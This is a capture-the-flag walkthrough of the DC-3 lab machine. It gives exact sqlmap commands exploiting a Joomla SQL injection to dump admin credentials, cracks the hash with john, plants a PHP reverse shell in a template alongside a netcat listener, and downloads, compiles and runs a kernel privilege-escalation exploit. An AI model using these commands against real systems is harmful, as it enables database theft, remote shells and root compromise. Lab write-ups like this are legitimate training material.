# DC - 3

directory enumeration

![](../.gitbook/assets/1111111111111111%20%2814%29.png)

nmap enumeration

![](../.gitbook/assets/1111111111111111%20%284%29.png)

the scan results show a joomla cms:

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2812%29.png)

the admin pannel of joomla is in /administrator directory:

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2815%29.png)

lets enumerate it with joomscan:

```text
joomscan --url http://192.168.56.126 -ec
```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2819%29.png)

searchsploit  shows that this version is vulnerable 

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2813%29.png)

lets read the exploit:

```text
cat `locate 42033.txt`
```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2814%29.png)

this is a SQLi, we can use sqlmap  as shown in the exploit guide :

```text
sqlmap -u "http://192.168.56.160/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2816%29.png)

we have the databases, lets find the tables:

```text
sqlmap -u "http://192.168.56.160/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb --tables
```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2820%29.png)

and the coulmns:

```text
sqlmap -u "http://192.168.56.160/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb -T '#__users'  --columns
```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%285%29.png)

then dump the username and password columns:

```text
sqlmap -u "http://192.168.56.160/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb -T '#__users'  -C username --dump
```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2817%29.png)

```text
sqlmap -u "http://192.168.56.160/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb -T '#__users'  -C password --dump

```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%284%29.png)

```text
admin
$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

save it in this format:

```text
admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

and run john to crack it:

```text
john hash
```

![](../.gitbook/assets/aaaaaaaaaaaaa%20%282%29.png)

admin : snoopy

login as admin in the cms admin login page:

{% embed url="http://192.168.56.160/administrator/" %}

![](../.gitbook/assets/aaaaaaaaaaaaa%20%288%29.png)

we have a template named protostart which is known for its vulnerability in joomla platforms \(google search\)

we can use this template to create a php shell on target system:

![](../.gitbook/assets/aaaaaaaaaaaaa.png)

i use pentest monkey reverse php shell :

/usr/share/webshells/php/php-reverse-shell.php

change the ip and port

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2811%29.png)

copy the content of the payload in the file content section:

![](../.gitbook/assets/aaaaaaaaaaaaa%20%286%29.png)

![](../.gitbook/assets/aaaaaaaaaaaaa%20%283%29.png)

now start a netcat listener and open the shell url in the browser:

{% embed url="https://192.168.56.160/templates/protostar/shell.php" %}

![](../.gitbook/assets/aaaaaaaaaaaaa%20%287%29.png)

lets get root:

ubuntu version 16.04

searchsploit ubuntu 16.04 local privilege escalation

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2810%29.png)

wget [https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip)

unzip 39772.zip

cd 39772

tar xvf exploit.tar

cd ebpf\_mapfd\_doubleput\_exploit/

./compile.sh

./doubleput

![](../.gitbook/assets/aaaaaaaaaaaaa%20%2818%29.png)

![](../.gitbook/assets/aaaaaaaaaaaaa%20%289%29.png)

done !





















